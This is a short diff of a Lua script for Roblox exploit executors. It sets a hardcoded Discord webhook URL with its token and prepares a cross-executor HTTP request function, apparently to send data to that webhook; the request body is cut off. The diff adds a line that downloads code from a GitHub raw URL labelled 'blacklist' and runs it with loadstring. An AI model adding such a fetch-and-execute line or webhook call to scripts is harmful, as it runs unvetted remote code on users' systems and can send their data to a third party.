@@ -1,5 +1,6 @@
 local HttpService = game:GetService("HttpService")
 Webhook_URL =  "https://discord.com/api/webhooks/1225843632352002099/1qBa8Kb582Fe5HylOPhEJEfbXPWLlhCklbIjftslVMb1E8Ojy52Hzw1qgzAsRzQEWd-G"
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ginchao/Function-FindFirstChild-Plr/main/blacklist"))()
 local httprequest = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or request
 httprequest(
 {
